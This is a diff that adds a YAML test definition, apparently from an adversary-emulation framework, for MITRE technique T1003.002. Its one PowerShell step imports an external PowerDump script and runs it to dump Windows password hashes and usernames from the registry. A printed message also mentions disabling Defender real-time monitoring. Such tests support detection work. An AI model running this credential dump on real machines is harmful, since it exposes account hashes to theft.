@@ -1,0 +1,24 @@
+api_version: "2.0"
+name: PowerDump Hashes and Usernames from Registry
+description: Executes a hashdump by reading the hashes from the registry.
+uuid: 804f28fc-68fc-40da-b5a2-e9d0bce5c193
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.002: Security Account Manager'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: powerdump-hashes-and-usernames-from-registry
+      inline: |-
+        Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
+        Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"
+        Invoke-PowerDump
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
